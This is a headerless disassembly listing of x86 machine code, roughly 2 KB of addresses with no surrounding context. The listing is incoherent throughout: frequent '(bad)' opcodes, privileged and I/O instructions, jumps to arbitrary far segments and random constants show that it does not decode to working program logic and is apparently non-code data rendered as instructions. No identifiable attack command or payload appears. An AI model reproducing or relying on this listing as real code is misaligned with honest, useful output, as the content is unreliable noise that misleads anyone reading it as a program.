  41ea4d:	add    ecx,esp
  41ea4f:	std    
  41ea50:	(bad)
  41ea53:	jmp    0x625b:0x350b4384
  41ea5a:	(bad)  
  41ea5b:	jne    0x41ea2c
  41ea5d:	mov    eax,ds:0xbe433bd8
  41ea62:	clc    
  41ea63:	addr16 aas 
  41ea65:	daa    
  41ea66:	dec    ebx
  41ea67:	(bad)
  41ea6b:	inc    ecx
  41ea6c:	xchg   ebp,eax
  41ea6d:	inc    esi
  41ea6e:	pop    eax
  41ea6f:	inc    eax
  41ea70:	inc    eax
  41ea71:	jge    0x41ea3c
  41ea73:	jp     0x41ea6e
  41ea75:	call   0x3bf3f915
  41ea7a:	vmread DWORD PTR [ecx],esi
  41ea7d:	xchg   ecx,eax
  41ea7e:	shl    BYTE PTR [ecx-0x3c],1
  41ea81:	jno    0x41eaed
  41ea83:	push   0x3db28a6c
  41ea88:	clc    
  41ea89:	loop   0x41ea73
  41ea8b:	mov    eax,ds:0xac5b76e8
  41ea90:	fdivrp st(6),st
  41ea92:	sbb    ebx,edx
  41ea94:	jle    0x41eab8
  41ea96:	push   cs
  41ea97:	and    eax,0x26b45f57
  41ea9c:	aam    0xea
  41ea9e:	in     eax,0xb0
  41eaa0:	xor    esi,DWORD PTR [ecx]
  41eaa2:	jmp    0x41ea58
  41eaa4:	adc    DWORD PTR [eax],edi
  41eaa6:	add    al,0xcc
  41eaa8:	lahf   
  41eaa9:	dec    ebx
  41eaaa:	mov    DWORD PTR [eax+eax*2-0x42],edi
  41eaae:	jge    0x41ea76
  41eab0:	das    
  41eab1:	or     BYTE PTR [edi],0x62
  41eab4:	outs   dx,DWORD PTR ds:[esi]
  41eab5:	ja     0x41ea79
  41eab7:	mov    esi,0xaa30b0de
  41eabc:	jmp    0x41eaae
  41eabe:	pop    ecx
  41eabf:	pop    esi
  41eac0:	mov    ah,0xdd
  41eac2:	jmp    0xe38fadcc
  41eac7:	nop
  41eac8:	pop    ecx
  41eac9:	sub    eax,0xcd1f24d5
  41eace:	test   al,0xb
  41ead0:	imul   ebp
  41ead2:	cwde   
  41ead3:	sysret 
  41ead5:	cli    
  41ead6:	adc    al,cl
  41ead8:	shl    DWORD PTR [esp+edi*4+0x5],1
  41eadc:	mov    dh,0xf2
  41eade:	enter  0x90ff,0xcb
  41eae2:	push   cs
  41eae3:	imul   DWORD PTR ds:0xc689ba14
  41eae9:	mov    cl,0xaa
  41eaeb:	cld    
  41eaec:	pop    edi
  41eaed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eaee:	test   al,0xe2
  41eaf0:	xchg   edi,eax
  41eaf1:	sub    BYTE PTR [ecx-0x5c],0xb6
  41eaf5:	xlat   BYTE PTR ds:[ebx]
  41eaf6:	mov    edi,DWORD PTR [ecx]
  41eaf8:	push   eax
  41eaf9:	inc    ecx
  41eafa:	(bad)  
  41eafb:	fucomi st,st(3)
  41eafd:	mov    ebx,0xec486a1a
  41eb02:	push   0x995a7891
  41eb07:	out    0xc0,al
  41eb09:	xchg   ebx,eax
  41eb0a:	lahf   
  41eb0b:	(bad)  
  41eb0c:	sbb    al,0xbc
  41eb0e:	aam    0xa1
  41eb10:	addr16 mov al,ds:0xc9ec
  41eb14:	pop    eax
  41eb15:	(bad)  
  41eb17:	call   DWORD PTR [edi+0x7c]
  41eb1a:	mov    dh,cl
  41eb1c:	aad    0xcb
  41eb1e:	out    0x9b,al
  41eb20:	push   edi
  41eb21:	bound  edi,QWORD PTR [esi+0x22b3a967]
  41eb27:	out    0xc,eax
  41eb29:	sbb    BYTE PTR [ebp-0x7c],cl
  41eb2c:	loop   0x41eae0
  41eb2e:	ror    DWORD PTR ss:[edx-0x22d57854],cl
  41eb35:	push   ebp
  41eb36:	mov    BYTE PTR [eax+edi*8-0x22],al
  41eb3a:	cs ja  0x41eb64
  41eb3d:	popa   
  41eb3e:	lods   al,BYTE PTR ds:[esi]
  41eb3f:	and    al,0xa7
  41eb41:	fld    DWORD PTR ds:0x4b76e1de
  41eb47:	dec    ecx
  41eb48:	mov    bh,0x9
  41eb4a:	daa    
  41eb4b:	or     ebx,DWORD PTR [edi-0x39cf92e9]
  41eb51:	xlat   BYTE PTR ds:[ebx]
  41eb52:	mov    edi,0x24932822
  41eb57:	popf   
  41eb58:	(bad)  [ecx]
  41eb5a:	in     eax,dx
  41eb5b:	inc    ebx
  41eb5c:	xor    DWORD PTR [ebx],0xdbb395e8
  41eb62:	scas   al,BYTE PTR es:[edi]
  41eb63:	popa   
  41eb64:	xchg   ebp,eax
  41eb65:	pop    ecx
  41eb66:	repnz add al,0x28
  41eb69:	repnz shr dh,0x40
  41eb6d:	mov    esp,DWORD PTR [esi]
  41eb6f:	daa    
  41eb70:	and    al,0x17
  41eb72:	pop    ebx
  41eb73:	cmp    ebp,DWORD PTR [ebp+eiz*2+0x2c35bb3d]
  41eb7a:	pushf  
  41eb7b:	mov    al,ds:0x3227f2d
  41eb80:	lahf   
  41eb81:	mov    ebp,0x36330917
  41eb86:	xchg   ebp,eax
  41eb87:	mov    bl,BYTE PTR [ebp-0x4f]
  41eb8a:	pop    esi
  41eb8b:	add    DWORD PTR [edx-0x7f],ecx
  41eb8e:	mov    ah,0xe5
  41eb90:	loop   0x41ebd7
  41eb92:	xchg   ecx,eax
  41eb93:	shl    esi,cl
  41eb95:	inc    edi
  41eb96:	dec    esi
  41eb97:	stos   DWORD PTR es:[edi],eax
  41eb98:	xor    bl,cl
  41eb9a:	mov    al,0x27
  41eb9c:	jo     0x41ebad
  41eb9e:	aam    0xb4
  41eba0:	push   0xffffffac
  41eba2:	fcmovu st,st(4)
  41eba4:	mov    dh,0xff
  41eba6:	xlat   BYTE PTR ds:[ebx]
  41eba7:	rcr    ebx,0xb4
  41ebaa:	jl     0x41ebb7
  41ebac:	ss nop
  41ebae:	stc    
  41ebaf:	retf   
  41ebb0:	fimul  WORD PTR [ecx]
  41ebb2:	sahf   
  41ebb3:	leave  
  41ebb4:	ja     0x41eb5c
  41ebb6:	xor    bl,bl
  41ebb8:	stos   DWORD PTR es:[edi],eax
  41ebb9:	mov    esp,0x823c904b
  41ebbe:	or     cl,bh
  41ebc0:	enter  0xdb42,0x63
  41ebc4:	mov    cx,0x2d91
  41ebc8:	or     eax,0xa73732f9
  41ebcd:	pop    esi
  41ebce:	scas   eax,DWORD PTR es:[edi]
  41ebcf:	ja     0x41eb7b
  41ebd1:	outs   dx,DWORD PTR ds:[esi]
  41ebd2:	popa   
  41ebd3:	loope  0x41eb9e
  41ebd5:	push   edx
  41ebd6:	cld    
  41ebd7:	jecxz  0x41ebe8
  41ebd9:	mov    edi,0x1f5d2a64
  41ebde:	sbb    eax,0x5c5f448c
  41ebe3:	inc    ebp
  41ebe4:	cmp    ch,BYTE PTR [esi+0x4c]
  41ebe7:	jp     0x41ec45
  41ebe9:	or     BYTE PTR [edx-0x732234e8],al
  41ebef:	popa   
  41ebf0:	outs   dx,BYTE PTR ds:[esi]
  41ebf1:	inc    edx
  41ebf2:	ret    0x6b85
  41ebf5:	or     esi,0xffffff96
  41ebf8:	lock xchg edi,eax
  41ebfa:	bound  edi,QWORD PTR [esi-0x2d]
  41ebfd:	fsub   st,st(7)
  41ebff:	vpshab xmm15,xmm7,[eax-0x39]
  41ec05:	mov    DWORD PTR ds:0x281dfcb0,ebx
  41ec0b:	enter  0xee9a,0x3
  41ec0f:	xor    eax,0xd5860295
  41ec14:	jns    0x41ec34
  41ec16:	in     al,0xbc
  41ec18:	popa   
  41ec19:	fwait
  41ec1a:	ror    esp,0x5f
  41ec1d:	mov    bl,BYTE PTR [edx]
  41ec1f:	adc    BYTE PTR [esi-0x34],0xb0
  41ec23:	(bad)  
  41ec24:	rcr    ah,1
  41ec26:	jecxz  0x41ec8c
  41ec28:	or     eax,0xe27ad677
  41ec2d:	leave  
  41ec2e:	pop    esp
  41ec2f:	nop
  41ec30:	pop    es
  41ec31:	ins    DWORD PTR es:[edi],dx
  41ec32:	or     DWORD PTR [edi],ebp
  41ec34:	adc    al,0x62
  41ec36:	(bad)  
  41ec37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec38:	push   ebp
  41ec39:	mov    WORD PTR [eax],es
  41ec3b:	or     BYTE PTR [eax+0x2],cl
  41ec3e:	es xchg edi,eax
  41ec40:	cmc    
  41ec41:	xlat   BYTE PTR ds:[ebx]
  41ec42:	ret    0xb450
  41ec45:	inc    ebp
  41ec46:	in     al,dx
  41ec47:	stos   DWORD PTR es:[edi],eax
  41ec48:	shl    DWORD PTR [ecx],1
  41ec4a:	popf   
  41ec4b:	out    dx,al
  41ec4c:	ds cmp eax,0x392636ff
  41ec52:	xchg   ebx,eax
  41ec53:	jmp    0xa50d3c69
  41ec58:	add    ah,BYTE PTR ds:[ebp+0x24775241]
  41ec5f:	push   DWORD PTR [eax+0x60f7aaf7]
  41ec65:	call   0x9da3:0x71b1080c
  41ec6c:	inc    ecx
  41ec6d:	popa   
  41ec6e:	(bad)  
  41ec70:	mov    esp,0x14426d5e
  41ec75:	retf   0xfd3d
  41ec78:	cs jmp 0x69a:0x2db6e5a3
  41ec80:	int    0x97
  41ec82:	push   ds
  41ec83:	retf   
  41ec84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec85:	xchg   BYTE PTR [edx],al
  41ec87:	jne    0x41ece8
  41ec89:	cmp    ebx,DWORD PTR [edi]
  41ec8b:	ss fsubp st(2),st
  41ec8f:	mov    esp,0xda24b4ad
  41ec94:	cli    
  41ec95:	xchg   ebx,eax
  41ec96:	mov    dl,0x55
  41ec98:	nop
  41ec99:	test   ax,0xd8d2
  41ec9d:	mov    ds:0x365f4e76,al
  41eca2:	sti    
  41eca3:	xor    eax,0x945cf0d5
  41eca8:	pop    edi
  41eca9:	mov    dl,0xed
  41ecab:	pop    ss
  41ecac:	mov    BYTE PTR [ebx+0xa7ce066],0x3a
  41ecb3:	xor    esi,DWORD PTR [eax-0x12]
  41ecb6:	mov    edx,0x8d562e8c
  41ecbb:	mov    ds:0xdb92a0c,al
  41ecc0:	jno    0x41ec6b
  41ecc2:	popw   ds
  41ecc4:	mov    eax,ds:0x2832930
  41ecc9:	and    eax,0xe5e9601c
  41ecce:	adc    eax,0x23632c2
  41ecd3:	xchg   edi,eax
  41ecd4:	call   0x679560e3
  41ecd9:	inc    ebx
  41ecda:	sahf   
  41ecdb:	or     ebx,ebx
  41ecdd:	add    al,0x5f
  41ecdf:	sahf   
  41ece0:	add    BYTE PTR [eax],cl
  41ece2:	xor    ch,BYTE PTR [edi]
  41ece4:	jne    0x41ecdc
  41ece6:	sub    al,0xa3
  41ece8:	dec    eax
  41ece9:	and    al,0x91
  41eceb:	popa   
  41ecec:	pushf  
  41eced:	daa    
  41ecee:	xchg   edi,eax
  41ecef:	int    0xbe
  41ecf1:	and    al,0xc8
  41ecf3:	xchg   edx,eax
  41ecf4:	add    BYTE PTR [ebp-0x2d65be84],dl
  41ecfa:	ja     0x41ed45
  41ecfc:	push   esi
  41ecfd:	mov    ah,0x3
  41ecff:	in     eax,dx
  41ed00:	dec    eax
  41ed01:	stos   DWORD PTR es:[edi],eax
  41ed02:	mov    WORD PTR [ecx+esi*2],fs
  41ed05:	les    eax,FWORD PTR [ecx+0x1f]
  41ed08:	(bad)  
  41ed09:	in     al,dx
  41ed0a:	fcomp  DWORD PTR [ecx+0x3c]
  41ed0d:	cld    
  41ed0e:	add    al,0x38
  41ed10:	ds (bad) 
  41ed12:	mov    ecx,eax
  41ed14:	scas   al,BYTE PTR es:[edi]
  41ed15:	int3   
  41ed16:	mov    edi,0x7c1d13a7
  41ed1b:	stos   BYTE PTR es:[edi],al
  41ed1c:	pop    ecx
  41ed1d:	sbb    DWORD PTR [ebx+0x46],0x52
  41ed21:	lea    ebp,[ecx+0x56]
  41ed24:	loop   0x41ed4d
  41ed26:	es ins DWORD PTR es:[edi],dx
  41ed28:	rcr    DWORD PTR [edi],1
  41ed2a:	pop    edi
  41ed2b:	fs jne 0x41ed10
  41ed2e:	pusha  
  41ed2f:	pop    ds
  41ed30:	dec    eax
  41ed31:	xchg   ebp,eax
  41ed32:	and    al,0x9
  41ed34:	cmp    ebp,edi
  41ed36:	mov    esi,0xadb07da4
  41ed3b:	mov    ds:0x526b92,al
  41ed40:	xchg   ecx,eax
  41ed41:	jecxz  0x41eda6
  41ed43:	test   BYTE PTR ds:0x4a353326,dl
  41ed49:	fldcw  WORD PTR [ecx+edx*8]
  41ed4c:	popf   
  41ed4d:	hlt    
  41ed4e:	rcl    DWORD PTR [edi-0x7d],0xe0
  41ed52:	mov    ds:0x2f681527,al
  41ed57:	es sub edx,esp
  41ed5a:	fcomp  DWORD PTR ds:[edx]
  41ed5d:	fnstcw WORD PTR [esi]
  41ed5f:	ret    0x85a5
  41ed62:	scas   eax,DWORD PTR es:[edi]
  41ed63:	cmc    
  41ed64:	out    dx,al
  41ed65:	inc    esp
  41ed66:	test   ch,ah
  41ed68:	in     al,dx
  41ed69:	leave  
  41ed6a:	mov    bh,0x33
  41ed6c:	jbe    0x41ed84
  41ed6e:	push   edi
  41ed6f:	mov    dh,0x25
  41ed71:	ins    DWORD PTR es:[edi],dx
  41ed72:	and    DWORD PTR [edx-0x65],eax
  41ed75:	call   0xbd9e0708
  41ed7a:	fdiv   QWORD PTR [ecx]
  41ed7c:	out    0x70,eax
  41ed7e:	or     dh,BYTE PTR [edx+0x31]
  41ed81:	fnstsw ax
  41ed83:	out    0x8c,eax
  41ed85:	jb     0x41ed28
  41ed87:	mov    esi,0xb1a9fcc5
  41ed8c:	ins    BYTE PTR es:[edi],dx
  41ed8d:	out    0x8c,eax
  41ed8f:	inc    eax
  41ed90:	pop    edx
  41ed91:	xchg   edi,eax
  41ed92:	mov    ebx,0xcfb1dcc0
  41ed97:	test   BYTE PTR [ecx-0x370e8de2],al
  41ed9d:	aad    0x5d
  41ed9f:	inc    ebx
  41eda1:	xchg   esp,eax
  41eda2:	pop    esp
  41eda3:	gs leave 
  41eda5:	js     0x41ed9b
  41eda7:	mov    al,ds:0x4266b194
  41edac:	cmp    BYTE PTR [esi+0x101df809],bh
  41edb2:	scas   al,BYTE PTR es:[edi]
  41edb3:	adc    eax,0x8642ae5d
  41edb8:	outs   dx,BYTE PTR ds:[esi]
  41edb9:	adc    esi,DWORD PTR [edi]
  41edbb:	stos   DWORD PTR es:[edi],eax
  41edbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edbd:	pop    ebp
  41edbe:	sahf   
  41edbf:	sbb    al,0xb6
  41edc1:	jo     0x41ed6e
  41edc3:	icebp  
  41edc4:	jmp    0x9716:0x5f6bea82
  41edcb:	aad    0xf
  41edcd:	xor    eax,DWORD PTR [esi+ecx*1-0x78d090fd]
  41edd4:	addr16 leave 
  41edd6:	(bad)  
  41edd7:	mov    esi,0x73cc5749
  41eddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eddd:	in     al,dx
  41edde:	or     DWORD PTR [ecx-0x4b17b3eb],ecx
  41ede4:	xor    BYTE PTR [ecx],dh
  41ede6:	xlat   BYTE PTR ds:[ebx]
  41ede7:	int3   
  41ede8:	add    bl,ah
  41edea:	and    esp,DWORD PTR [ebp-0x16]
  41eded:	retf   
  41edee:	inc    eax
  41edef:	mov    ds:0x6eda1861,al
  41edf4:	push   0xe3c4023
  41edf9:	cs mov bh,0x40
  41edfc:	jle    0x41edc7
  41edfe:	inc    esi
  41edff:	call   0x934853b
  41ee04:	jge    0x41ee53
  41ee06:	nop
  41ee07:	cmp    eax,esp
  41ee09:	and    al,0xfa
  41ee0b:	sbb    eax,0x1b68
  41ee10:	add    BYTE PTR [eax],al
  41ee12:	push   edx
  41ee13:	push   ecx
  41ee14:	cmp    BYTE PTR [ebx],al
  41ee16:	cmp    ebp,DWORD PTR [ebx+0x7b]
  41ee19:	push   ecx
  41ee1a:	pop    edx
  41ee1b:	mov    ch,0xf5
  41ee1d:	lahf   
  41ee1e:	jne    0x41ee56
  41ee20:	mov    eax,ds:0x169115a
  41ee25:	add    ah,dh
  41ee27:	add    al,0x0
  41ee29:	add    BYTE PTR [ebp-0x1d],bl
  41ee2c:	push   es
  41ee2d:	arpl   WORD PTR [esi+ecx*8-0x2d],di
  41ee31:	mov    bh,0x83
  41ee33:	inc    esp
  41ee34:	xor    al,0xe5
  41ee36:	mov    eax,ds:0x28f9df71
  41ee3b:	push   0x62bd6149
  41ee40:	and    eax,0x6fe2b63d
  41ee45:	inc    esi
  41ee46:	stos   BYTE PTR es:[edi],al
  41ee47:	xchg   ebx,eax
  41ee48:	je     0x41eec9
  41ee4a:	aam    0x5
  41ee4c:	pop    ds
  41ee4d:	in     al,dx
  41ee4e:	je     0x41ee1b
  41ee50:	dec    al
  41ee52:	jmp    0x1bd814c5
  41ee57:	shr    BYTE PTR [ebx+eiz*2-0x1e],cl
  41ee5b:	aas    
  41ee5c:	mov    es,ebp
  41ee5e:	push   ds
  41ee5f:	add    bl,BYTE PTR [eax-0x9]
  41ee62:	xchg   ebx,eax
  41ee63:	imul   eax,DWORD PTR [ebx-0x47a07fa2],0xf
  41ee6a:	mov    ds:0x75d72026,al
  41ee6f:	inc    edi
  41ee70:	sub    ebp,ebp
  41ee72:	and    DWORD PTR [ecx+0x5c55cd4b],ecx
  41ee78:	xor    al,0xc0
  41ee7a:	inc    edx
  41ee7b:	jle    0x41ee83
  41ee7d:	mov    dh,0x2d
  41ee7f:	jbe    0x41ee36
  41ee81:	cmp    eax,0x50c45e72
  41ee86:	pop    ecx
  41ee87:	or     DWORD PTR [edi+0x31c7063a],ecx
  41ee8d:	jns    0x41eef7
  41ee8f:	push   ebp
  41ee90:	rcr    DWORD PTR [ecx+0x3b],1
  41ee93:	out    dx,eax
  41ee94:	stos   BYTE PTR es:[edi],al
  41ee95:	xor    DWORD PTR [esi+0x1f],ebx
  41ee98:	int3   
  41ee99:	out    dx,al
  41ee9a:	push   esi
  41ee9b:	mov    ds:0x343a4577,eax
  41eea0:	jl     0x41ef00
  41eea2:	mov    ebx,0x1eb9d48d
  41eea7:	inc    ebx
  41eea8:	sbb    al,0x9f
  41eeaa:	push   ds
  41eeab:	push   ecx
  41eeac:	add    BYTE PTR [esp+esi*8+0x2a492981],cl
  41eeb3:	adc    DWORD PTR [esi],edi
  41eeb5:	pop    edi
  41eeb6:	add    al,0x13
  41eeb8:	dec    ebp
  41eeb9:	lods   eax,DWORD PTR ds:[esi]
  41eeba:	ja     0x41ee4d
  41eebc:	pop    ds
  41eebd:	or     al,0xe7
  41eebf:	inc    ebx
  41eec0:	mov    edx,?
  41eec2:	sub    esi,DWORD PTR [ebp+edx*1-0x60]
  41eec6:	fwait
  41eec7:	sti    
  41eec8:	and    edx,DWORD PTR [ecx+0x341331d7]
  41eece:	jnp    0x41ee57
  41eed0:	sub    bl,BYTE PTR [ebx-0x563a0c43]
  41eed6:	outs   dx,BYTE PTR ds:[esi]
  41eed7:	push   esp
  41eed8:	sar    BYTE PTR [esi-0x7b3f3997],cl
  41eede:	lods   eax,DWORD PTR ds:[esi]
  41eedf:	leave  
  41eee0:	enter  0xd770,0x34
  41eee4:	jbe    0x41ef09
  41eee6:	repz push edi
  41eee8:	push   eax
  41eee9:	dec    ecx
  41eeea:	push   esp
  41eeeb:	repnz clc 
  41eeed:	pushf  
  41eeee:	or     ch,0xb6
  41eef1:	test   BYTE PTR [eax+0x7a2618be],0x96
  41eef8:	retf   0xd2a0
  41eefb:	fwait
  41eefc:	enter  0x59ce,0xa1
  41ef00:	sub    al,0xab
  41ef02:	clc    
  41ef03:	fs inc esp
  41ef05:	mov    al,0x62
  41ef07:	int    0x6c
  41ef09:	sbb    esi,DWORD PTR [eax+0x30]
  41ef0c:	maskmovq mm1,mm6
  41ef0f:	(bad)  
  41ef10:	out    dx,eax
  41ef11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef12:	pop    edx
  41ef13:	ins    DWORD PTR es:[edi],dx
  41ef14:	imul   edi,DWORD PTR [ecx],0xffffffd0
  41ef17:	sub    al,0x70
  41ef19:	xchg   ebx,eax
  41ef1a:	mov    ah,0x92
  41ef1c:	outs   dx,DWORD PTR ds:[esi]
  41ef1d:	pop    edi
  41ef1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef1f:	outs   dx,BYTE PTR ds:[esi]
  41ef20:	xor    al,BYTE PTR [ebx+0x476e18f9]
  41ef26:	popf   
  41ef27:	or     al,0xa5
  41ef29:	cmp    al,0x4d
  41ef2b:	int    0x96
  41ef2d:	push   cs
  41ef2e:	cmp    al,0xc1
  41ef30:	sbb    dh,BYTE PTR [ebx+0x73]
  41ef33:	sar    edi,1
  41ef35:	pop    ss
  41ef36:	jo     0x41ef19
  41ef38:	mov    esi,0x2817b483
  41ef3d:	or     eax,0xd717ab43
  41ef42:	adc    esi,DWORD PTR [esi+0x78]
  41ef45:	fsubr  st(1),st
  41ef47:	daa    
  41ef48:	cmp    cl,ch
  41ef4a:	inc    ebp
  41ef4b:	mov    al,ds:0xf2aa6e47
  41ef50:	pushf  
  41ef51:	imul   eax,DWORD PTR [ebp+0x27],0xd49b50ec
  41ef58:	ja     0x41eeff
  41ef5a:	sahf   
  41ef5b:	xor    ah,BYTE PTR [edx+0x11]
  41ef5e:	cmp    al,0x38
  41ef60:	in     eax,dx
  41ef61:	sbb    edx,eax
  41ef63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef64:	cmp    esi,ebx
  41ef66:	dec    ecx
  41ef67:	popa   
  41ef68:	mov    ebx,0x7f2280c1
  41ef6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef6e:	arpl   WORD PTR [ecx+0x57c841f5],si
  41ef74:	sub    ebx,ebx
  41ef76:	and    al,0x2e
  41ef78:	sbb    dh,BYTE PTR [ebx-0x485fbedc]
  41ef7e:	popa   
  41ef7f:	lahf   
  41ef80:	(bad)
  41ef83:	cmp    BYTE PTR [ebp-0x6f3e7ee1],0x8
  41ef8a:	and    bl,BYTE PTR [edx+0x6e]
  41ef8d:	pop    ebx
  41ef8e:	scas   al,BYTE PTR es:[edi]
  41ef8f:	sub    ecx,DWORD PTR [ebp+ebp*2-0x66ebbb04]
  41ef96:	jno    0x41ef4e
  41ef98:	push   eax
  41ef99:	mov    eax,DWORD PTR [ebx+ebx*2-0x2443a994]
  41efa0:	test   DWORD PTR [esi-0x72cc0fce],0x6b573058
  41efaa:	sbb    DWORD PTR [edi],ebx
  41efac:	pop    ds
  41efad:	retf   
  41efae:	mov    edi,0x99d83c79
  41efb3:	in     eax,dx
  41efb4:	cmp    BYTE PTR [ebx],0x73
  41efb7:	adc    ebp,DWORD PTR [esi]
  41efb9:	pusha  
  41efba:	push   ebx
  41efbb:	pop    ebp
  41efbc:	popa   
  41efbd:	std    
  41efbe:	not    DWORD PTR [ebp-0x33]
  41efc1:	rcr    BYTE PTR [eax],1
  41efc3:	les    esi,FWORD PTR [ebx+0xd]
  41efc6:	xor    eax,0x74ad90ea
  41efcb:	ja     0x41efde
  41efcd:	repnz mul BYTE PTR [ebp-0x70]
  41efd1:	inc    esi
  41efd2:	xor    cl,BYTE PTR [eax-0x7c]
  41efd5:	mov    eax,DWORD PTR ds:0x3a587854
  41efdb:	push   ecx
  41efdc:	fisub  DWORD PTR [edx]
  41efde:	pusha  
  41efdf:	out    dx,eax
  41efe0:	and    ah,BYTE PTR [ecx]
  41efe2:	mov    ebp,0xffc29ba2
  41efe7:	and    BYTE PTR [edi-0x6e4161f9],dl
  41efed:	push   ss
  41efee:	and    DWORD PTR [esi-0x54],0xbd003943
  41eff5:	jle    0x41efbe
  41eff7:	inc    edi
  41eff8:	push   ebp
  41eff9:	cmp    dh,BYTE PTR [edi-0x70]
  41effc:	clc    
  41effd:	pusha  
  41effe:	aaa    
  41efff:	mov    cl,0x1e
  41f001:	dec    ebx
  41f002:	push   esi
  41f003:	shl    DWORD PTR [ecx+0x6c85107f],1
  41f009:	dec    BYTE PTR [eax+0x2cc22576]
  41f00f:	jmp    0x41eff8
  41f011:	stos   BYTE PTR es:[edi],al
  41f012:	jno    0x41f070
  41f014:	clc    
  41f015:	push   ss
  41f016:	jmp    0x52e4979b
  41f01b:	and    BYTE PTR [edx-0x42c0deea],0x1b
  41f022:	sub    al,BYTE PTR [ecx+eiz*4]
  41f025:	jb     0x41efd1
  41f027:	pop    es
  41f028:	leave  
  41f029:	std    
  41f02a:	(bad)  
  41f02b:	rcr    dl,1
  41f02d:	xchg   edi,eax
  41f02e:	das    
  41f02f:	and    esp,DWORD PTR [eax]
  41f031:	call   0x7cb7:0x9face897
  41f038:	push   cs
  41f039:	outs   dx,BYTE PTR ds:[esi]
  41f03a:	in     eax,0x8a
  41f03c:	fs pop ecx
  41f03e:	shl    BYTE PTR [ebp-0x37a84ccb],cl
  41f044:	(bad)  [esi-0x469cec9f]
  41f04a:	and    esp,ebx
  41f04c:	push   ds
  41f04d:	sub    BYTE PTR [ecx],0xd1
  41f050:	and    esi,edi
  41f052:	jecxz  0x41efdf
  41f054:	jge    0x41efe7
  41f056:	adc    DWORD PTR [ebx],ebp
  41f058:	xchg   esi,eax
  41f059:	jge    0x41f084
  41f05b:	fadd   QWORD PTR [eax]
  41f05d:	pop    ss
  41f05e:	xchg   ebx,eax
  41f05f:	mov    ah,0xcc
  41f061:	mov    ebx,0x1222d414
  41f066:	adc    cl,0xf1
  41f069:	adc    al,0xbd
  41f06b:	pop    edx
  41f06c:	pop    es
  41f06d:	and    al,0xa9
  41f06f:	in     eax,0xc0
  41f071:	ret    0x26cc
  41f074:	mov    ebx,0xc6e0bd8
  41f079:	call   0x18da:0x2e69caca
  41f080:	jb     0x41f0cc
  41f082:	adc    edi,edx
  41f084:	out    0x66,eax
  41f086:	add    cl,BYTE PTR ss:[ecx+0x31bfadfb]
  41f08d:	hlt    
  41f08e:	xchg   ecx,eax
  41f08f:	scas   al,BYTE PTR es:[edi]
  41f090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f091:	add    al,0x34
  41f093:	pop    ebx
  41f094:	inc    esi
  41f095:	jns    0x41f05d
  41f097:	(bad)  [ebx+0x20]
  41f09a:	mov    cs,WORD PTR [ebx+0x5ec1d029]
  41f0a0:	inc    DWORD PTR [ecx-0x40]
  41f0a3:	push   es
  41f0a4:	jbe    0x41f02c
  41f0a6:	push   esi
  41f0a7:	cmp    cl,BYTE PTR [ebx+0x156894ae]
  41f0ad:	sbb    eax,0xe4657e89
  41f0b2:	or     dh,BYTE PTR [eax+0x68]
  41f0b5:	mov    eax,ds:0xbe910d2c
  41f0ba:	jge    0x41f107
  41f0bc:	pop    ss
  41f0bd:	outs   dx,BYTE PTR ds:[esi]
  41f0be:	pusha  
  41f0bf:	in     al,0x7e
  41f0c1:	jno    0x41f081
  41f0c3:	mov    al,ds:0x9a0d9cbd
  41f0c8:	pusha  
  41f0c9:	pop    ebx
  41f0ca:	xchg   ebp,eax
  41f0cb:	pop    ecx
  41f0cc:	sub    ebx,ecx
  41f0ce:	out    dx,al
  41f0cf:	test   eax,0xf72b0b32
  41f0d5:	mov    ebx,0x25affbe7
  41f0da:	sbb    al,0xbb
  41f0dc:	in     al,0xd9
  41f0de:	pushf  
  41f0df:	daa    
  41f0e0:	imul   esi,edi,0x64
  41f0e3:	cmc    
  41f0e4:	mov    al,0x15
  41f0e6:	or     eax,0x33318fde
  41f0eb:	loope  0x41f133
  41f0ed:	retw   0x71aa
  41f0f1:	neg    esp
  41f0f3:	(bad)
  41f0f7:	or     DWORD PTR [esi+0x35e8bb09],edx
  41f0fd:	out    0xc2,eax
  41f0ff:	gs add al,0xfb
  41f102:	xchg   ebx,eax
  41f103:	fcomp  DWORD PTR [edx]
  41f105:	sub    al,0xc5
  41f107:	lahf   
  41f108:	jmp    0x41f122
  41f10a:	xchg   DWORD PTR [ebp-0x2844bb4f],edx
  41f110:	pop    ebx
  41f111:	xor    ch,dh
  41f113:	cmp    eax,0x9163505b
  41f118:	mov    es,WORD PTR [edi]
  41f11a:	and    edi,DWORD PTR [edx]
  41f11c:	pop    DWORD PTR ds:0x4292be7
  41f122:	inc    edi
  41f123:	adc    eax,0x68ee7999
  41f128:	aam    0x83
  41f12a:	adc    DWORD PTR [esp+edi*2+0x4c59669e],ecx
  41f131:	cmp    DWORD PTR [esp+ebx*8+0x5c],edi
  41f135:	push   ebp
  41f136:	pop    esp
  41f137:	pop    bx
  41f139:	bound  eax,QWORD PTR [edx+edx*4-0x38af87a0]
  41f140:	or     eax,0xba103eab
  41f145:	stos   BYTE PTR es:[edi],al
  41f146:	in     al,dx
  41f147:	arpl   WORD PTR [edi+ebx*1+0x78],dx
  41f14b:	and    edi,DWORD PTR [ebx-0x495f811e]
  41f151:	fwait
  41f152:	test   BYTE PTR [ebx-0x77],dl
  41f155:	push   edi
  41f156:	idiv   DWORD PTR [ecx+ebp*4]
  41f159:	xchg   esp,eax
  41f15a:	arpl   si,ax
  41f15c:	add    eax,0x7082cebc
  41f161:	push   es
  41f162:	nop
  41f163:	mov    dl,0xfd
  41f165:	aad    0xe4
  41f167:	or     esi,esi
  41f169:	add    DWORD PTR [di],eax
  41f16c:	stos   DWORD PTR es:[edi],eax
  41f16d:	dec    ebx
  41f16e:	dec    edx
  41f16f:	lea    esp,[ebx]
  41f171:	cmp    dl,0x65
  41f174:	jmp    0x8a814b74
  41f179:	mov    ah,BYTE PTR [eax]
  41f17b:	mov    bl,0xc1
  41f17d:	jg     0x41f1fc
  41f17f:	lods   eax,DWORD PTR ds:[esi]
  41f180:	fsubr  st(5),st
  41f182:	fist   WORD PTR [ecx]
  41f184:	(bad)  
